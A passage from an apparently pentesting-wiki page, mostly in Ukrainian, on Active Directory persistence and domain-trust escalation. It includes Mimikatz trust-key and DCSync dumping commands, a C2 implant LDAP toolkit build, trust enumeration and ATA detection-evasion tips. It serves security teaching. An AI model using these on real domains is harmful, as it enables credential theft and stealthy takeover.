**Security descriptors** використовуються для **зберігання** **дозволів**, які має **об’єкт** над **іншим об’єктом**. Якщо ви зможете зробити навіть **небагату зміну** в **security descriptor** об’єкта, ви зможете отримати дуже цікаві привілеї над цим об’єктом, не будучи членом привілейованої групи.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Змініть **LSASS** в пам’яті, щоб встановити **універсальний пароль**, який дає доступ до всіх доменних облікових записів.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити власний **SSP**, щоб **захоплювати** в **очевидному вигляді** credentials, що використовуються для доступу до машини.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Реєструє **новий Domain Controller** в AD і використовує його для **push attribute** (SIDHistory, SPNs...) на вказані об’єкти **без** залишення логів щодо **змін**. Вам потрібні DA привілеї і бути в **root domain**.\
Зверніть увагу, що якщо ви використаєте неправильні дані, з’являться досить помітні логи.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Раніше ми обговорювали, як ескалювати привілеї, якщо у вас є **достатні права для читання LAPS passwords**. Однак ці паролі також можна використовувати для **підтримання persistence**.\
Дивіться:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft розглядає **Forest** як межу безпеки. Це означає, що **компрометація одного домену потенційно може призвести до компрометації всього Forest**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це механізм безпеки, який дозволяє користувачу з одного **domain** отримувати доступ до ресурсів в іншому **domain**. Він фактично створює зв’язок між системами автентифікації двох доменів, дозволяючи потокам перевірки автентичності проходити безперешкодно. Коли домени налаштовують довіру, вони обмінюються і зберігають певні **keys** на своїх **Domain Controllers (DCs)**, які є критичними для цілісності довіри.

У типовому сценарії, якщо користувач хоче отримати доступ до сервісу в **trusted domain**, він повинен спочатку запросити спеціальний квиток, відомий як **inter-realm TGT**, від свого DC в рідному домені. Цей TGT шифрується спільним **key**, узгодженим обома доменами. Користувач потім пред’являє цей TGT **DC trusted domain**, щоб отримати service ticket (**TGS**). Після успішної перевірки inter-realm TGT DC trusted domain видає TGS, надаючи користувачу доступ до сервісу.

**Кроки**:

1. **Клієнтський комп’ютер** в **Domain 1** починає процес, використовуючи свій **NTLM hash** для запиту **Ticket Granting Ticket (TGT)** від свого **Domain Controller (DC1)**.
2. Якщо клієнт успішно аутентифікований, DC1 видає новий TGT.
3. Клієнт потім запитує **inter-realm TGT** від DC1, який потрібен для доступу до ресурсів у **Domain 2**.
4. Inter-realm TGT шифрується зі **trust key**, що розділяється між DC1 і DC2 як частина двосторонньої domain trust.
5. Клієнт передає inter-realm TGT **Domain 2's Domain Controller (DC2)**.
6. DC2 перевіряє inter-realm TGT за допомогою спільного trust key і, якщо він дійсний, видає **Ticket Granting Service (TGS)** для сервера в Domain 2, до якого клієнт хоче отримати доступ.
7. Нарешті, клієнт пред’являє цей TGS серверу, який зашифрований за допомогою hash облікового запису сервера, щоб отримати доступ до сервісу в Domain 2.

### Different trusts

Важливо зауважити, що **довіра може бути односпрямованою або двосторонньою**. У випадку двосторонньої опції, обидва домени довіряють один одному, але у **односпрямованому** відношенні один з доменів буде **trusted**, а інший — **trusting** домен. У останньому випадку **ви зможете доступатися лише до ресурсів всередині trusting domain з trusted domain**.

Якщо Domain A trusts Domain B, A є trusting доменом, а B — trusted. До того ж, в **Domain A** це буде **Outbound trust**; а в **Domain B** — **Inbound trust**.

**Різні типи довірчих відносин**

- **Parent-Child Trusts**: Це звичне налаштування в межах одного forest, де child domain автоматично має двосторонню транзитивну довіру з батьківським доменом. Це означає, що запити автентифікації можуть вільно проходити між батьком і дитиною.
- **Cross-link Trusts**: Відомі як "shortcut trusts", вони встановлюються між child domains для прискорення процесів перенаправлення. У складних forest аутентифікаційні перенаправлення зазвичай мають прослідувати до кореня forest та назад до цільового домену. Створюючи cross-links, шлях скорочується, що особливо корисно в географічно розподілених середовищах.
- **External Trusts**: Встановлюються між різними, несуміжними доменами і за своєю природою не є транзитивними. Згідно з [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts корисні для доступу до ресурсів у домені поза поточним forest, який не пов’язаний forest trust. Безпека підсилюється використанням SID filtering з external trusts.
- **Tree-root Trusts**: Ці довіри автоматично встановлюються між forest root domain і новододаним tree root. Хоча зустрічаються рідко, tree-root trusts важливі для додавання нових domain trees до forest, дозволяючи їм зберігати унікальне ім’я домену і забезпечуючи двосторонню транзитивність. Більше інформації доступно в [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Цей тип довіри — двостороння транзитивна довіра між двома forest root доменами, також примусово застосовує SID filtering для підвищення безпеки.
- **MIT Trusts**: Ці довіри встановлюються з не-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos доменами. MIT trusts більш спеціалізовані і призначені для середовищ, що вимагають інтеграції з Kerberos-системами поза Windows екосистемою.

#### Інші відмінності у **trusting relationships**

- Відносини довіри також можуть бути **транзитивними** (A довіряє B, B довіряє C, тоді A довіряє C) або **нетранзитивними**.
- Відносини довіри можуть бути налаштовані як **bidirectional trust** (обидва довіряють один одному) або як **one-way trust** (лише один довіряє іншому).

### Attack Path

1. **Перелічити** trusting relationships
2. Перевірити, чи будь-який **security principal** (user/group/computer) має **доступ** до ресурсів **іншого домену**, можливо через ACE entries або перебування в групах іншого домену. Шукайте **відносини між доменами** (ймовірно саме для цього була створена довіра).
1. kerberoast у цьому випадку також може бути опцією.
3. **Скомпрометувати** **облікові записи**, які можуть **пивотити** між доменами.

Атакувальники можуть мати доступ до ресурсів в іншому домені через три основні механізми:

- **Local Group Membership**: Принципали можуть бути додані до локальних груп на машинах, наприклад групи “Administrators” на сервері, даючи їм значний контроль над тією машиною.
- **Foreign Domain Group Membership**: Принципали також можуть бути членами груп у зовнішньому домені. Однак ефективність цього методу залежить від природи довіри та області дії групи.
- **Access Control Lists (ACLs)**: Принципали можуть бути вказані в **ACL**, зокрема як сутності в **ACEs** всередині **DACL**, надаючи їм доступ до конкретних ресурсів. Для тих, хто хоче глибше розібратися у механіці ACLs, DACLs і ACEs, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” є безцінним ресурсом.

### Find external users/groups with permissions

Ви можете перевірити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, щоб знайти foreign security principals у домені. Це будуть user/group з **зовнішнього домену/forest**.

Ви можете перевірити це в **Bloodhound** або використовуючи **powerview**:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Інші способи перерахувати довіри доменів:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Є **2 trusted keys**: один для _дочірній --> батьківський_ і інший для _батьківський_ --> _дочірній_.\
> Ви можете дізнатися, який використовується поточним доменом, за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Ескалація до Enterprise admin у дочірній/батьківський домен шляхом зловживання довірою через SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Розуміння того, як можна експлуатувати Configuration Naming Context (NC), має вирішальне значення. Configuration NC слугує центральним сховищем конфігураційних даних по всьому лісу в середовищах Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у лісі, причому записувані DC зберігають записувану копію Configuration NC. Щоб використати це, потрібно мати **SYSTEM privileges on a DC**, бажано на дочірньому DC.

**Link GPO to root DC site**

Контейнер Sites у Configuration NC містить інформацію про сайти всіх комп'ютерів, приєднаних до домену, в межах AD-лісу. Маючи привілеї SYSTEM на будь-якому DC, атакуючі можуть прив'язати GPO до кореневих сайтів DC. Це потенційно ставить під загрозу кореневий домен шляхом маніпуляцій політиками, що застосовуються до цих сайтів.

Для детальної інформації можна ознайомитися з дослідженням [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Один з векторів атаки — спрямування на привілейовані gMSA у домені. KDS Root key, необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи привілеї SYSTEM на будь-якому DC, можна отримати доступ до KDS Root key і обчислити паролі для будь-якого gMSA по всьому лісу.

Детальний аналіз і покрокові інструкції можна знайти в:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Доповнювальна делегована атака на MSA (BadSuccessor – зловживання атрибутами migration):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Додаткові зовнішні дослідження: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Цей метод вимагає терпіння — очікування створення нових привілейованих AD-об'єктів. Маючи привілеї SYSTEM, атакуючий може змінити AD Schema, надавши будь-якому користувачу повний контроль над усіма класами. Це може призвести до несанкціонованого доступу та контролю над новоствореними AD-об'єктами.

Детальніше читайте в [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Уразливість ADCS ESC5 націлена на контроль над об'єктами Public Key Infrastructure (PKI) для створення шаблону сертифіката, який дозволяє автентифікацію як будь-якого користувача у лісі. Оскільки PKI-об'єкти розміщені в Configuration NC, компрометація записуваного дочірнього DC дає змогу виконати ESC5-атаки.

Більше деталей можна прочитати в [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). У сценаріях без ADCS атакуючий може налаштувати необхідні компоненти самостійно, як описано в [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
У цьому сценарії **до вашого домену встановлено довіру** з боку зовнішнього домену, що надає вам **невизначені повноваження** над ним. Вам потрібно з'ясувати, **які суб'єкти вашого домену мають який доступ до зовнішнього домену**, а потім спробувати це експлуатувати:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Зовнішній лісовий домен — односторонній (вихідний)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
У цьому сценарії **your domain** is **trusting** some **privileges** to principal from a **different domains**.

However, when a **domain is trusted** by the trusting domain, the trusted domain **creates a user** with a **predictable name** that uses as **password the trusted password**. Which means that it's possible to **access a user from the trusting domain to get inside the trusted one** to enumerate it and try to escalate more privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Another way to compromise the trusted domain is to wait in a machine where a **user from the trusted domain can access** to login via **RDP**. Then, the attacker could inject code in the RDP session process and **access the origin domain of the victim** from there.\
Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Міри захисту від зловживання довірчими відносинами доменів

### **SID Filtering:**

- Ризик атак, що використовують атрибут SID history через forest trusts, пом'якшується завдяки SID Filtering, який за замовчуванням активований на всіх inter-forest trusts. Це базується на припущенні, що intra-forest trusts є безпечними, оскільки Microsoft розглядає forest, а не domain, як межу безпеки.
- Однак є підводний камінь: SID filtering може порушити роботу додатків і доступ користувачів, що іноді призводить до його відключення.

### **Selective Authentication:**

- Для inter-forest trusts використання Selective Authentication гарантує, що користувачі з обох forests не аутентифікуються автоматично. Натомість потрібні явні дозволи, щоб користувачі могли отримати доступ до domains та серверів у trusting domain або forest.
- Важливо зазначити, що ці заходи не захищають від експлуатації writable Configuration Naming Context (NC) або атак на trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ре-реалізує bloodyAD-style LDAP primitives як x64 Beacon Object Files, що виконуються повністю всередині on-host implant (наприклад, Adaptix C2). Оператори збирають пакет командою `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, завантажують `ldap.axs`, а потім викликають `ldap <subcommand>` з beacon. Весь трафік використовує поточний контекст безпеки логону через LDAP (389) із signing/sealing або LDAPS (636) з автоматичною довірою сертифікатів, тому не потрібні socks proxies або артефакти на диску.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` розв'язують короткі імена/OU paths у повні DNs і вивантажують відповідні об'єкти.
- `get-object`, `get-attribute`, and `get-domaininfo` витягують довільні атрибути (включаючи security descriptors) плюс метадані forest/domain з `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` виявляють roasting candidates, налаштування delegation і наявні [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) дескриптори безпосередньо з LDAP.
- `get-acl` and `get-writable --detailed` парсять DACL, щоб перерахувати trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) та наслідування, даючи негайні цілі для ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP примітиви запису для ескалації та персистенції

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) дають оператору змогу розміщувати нові облікові записи користувачів або комп’ютерів там, де існують права над OU. `add-groupmember`, `set-password`, `add-attribute`, і `set-attribute` безпосередньо захоплюють цілі після отримання прав write-property.
- Команди, орієнтовані на ACL, такі як `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, і `add-dcsync`, перетворюють WriteDACL/WriteOwner на будь-якому AD-об’єкті у скидання паролів, контроль членства в групах або привілеї DCSync без залишення PowerShell/ADSI артефактів. Відповідні `remove-*` команди очищують інжектовані ACE.

### Делегування, roasting та зловживання Kerberos

- `add-spn`/`set-spn` миттєво роблять скомпрометованого користувача Kerberoastable; `add-asreproastable` (UAC toggle) позначає його для AS-REP roasting без торкання пароля.
- Делегаційні макроси (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) перезаписують `msDS-AllowedToDelegateTo`, UAC flags або `msDS-AllowedToActOnBehalfOfOtherIdentity` з beacon, дозволяючи шляхи атак constrained/unconstrained/RBCD та усуваючи потребу в remote PowerShell або RSAT.

### Впровадження sidHistory, переміщення OU та формування поверхні атаки

- `add-sidhistory` інжектує привілейовані SIDs у SID history контрольованого principal’а (див. [SID-History Injection](sid-history-injection.md)), забезпечуючи приховане успадкування доступу повністю через LDAP/LDAPS.
- `move-object` змінює DN/OU комп’ютерів або користувачів, дозволяючи нападнику перетягувати активи в OUs, де вже існують делеговані права, перед тим як зловживати `set-password`, `add-groupmember` або `add-spn`.
- Тісно сфокусовані команди видалення (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дозволяють швидко відкотити зміни після того, як оператор зібрав креденшіали або налаштував персистенцію, мінімізуючи телеметрію.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Деякі загальні засоби захисту

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Заходи захисту облікових даних**

- **Domain Admins Restrictions**: Рекомендується дозволяти Domain Admins входити лише на Domain Controllers, уникаючи їх використання на інших хостах.
- **Service Account Privileges**: Сервіси не повинні запускатися з привілеями Domain Admin (DA) для підтримки безпеки.
- **Temporal Privilege Limitation**: Для завдань, що потребують привілеїв DA, слід обмежувати їх тривалість. Це можна реалізувати за допомогою: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Реалізація технік deception**

- Реалізація deception включає встановлення пасток, таких як привабливі (decoy) користувачі або комп’ютери, з ознаками, наприклад паролями, що не закінчуються, або позначенням Trusted for Delegation. Детальний підхід включає створення користувачів із конкретними правами або додавання їх до груп із високими привілеями.
- Практичний приклад включає використання інструментів, наприклад: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Більше про розгортання технік deception можна знайти на [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Виявлення deception**

- **Для об’єктів користувачів**: Підозрілі індикатори включають нетиповий ObjectSID, рідкісні входи, дати створення та низьку кількість невдалих спроб пароля.
- **Загальні індикатори**: Порівняння атрибутів потенційних decoy-об’єктів із реальними може виявити невідповідності. Інструменти на кшталт [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) можуть допомогти в ідентифікації таких deception.

### **Обхід систем виявлення**

- **Microsoft ATA Detection Bypass**:
  - **User Enumeration**: Уникнення сесійної енумерації на Domain Controllers, щоб запобігти виявленню ATA.
  - **Ticket Impersonation**: Використання ключів **aes** для створення квитків допомагає уникати виявлення, не понижуючи до NTLM.
  - **DCSync Attacks**: Радиться виконувати атаки з не-Domain Controller, щоб уникнути виявлення ATA, оскільки пряме виконання з Domain Controller викличе сповіщення.

## Посилання

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
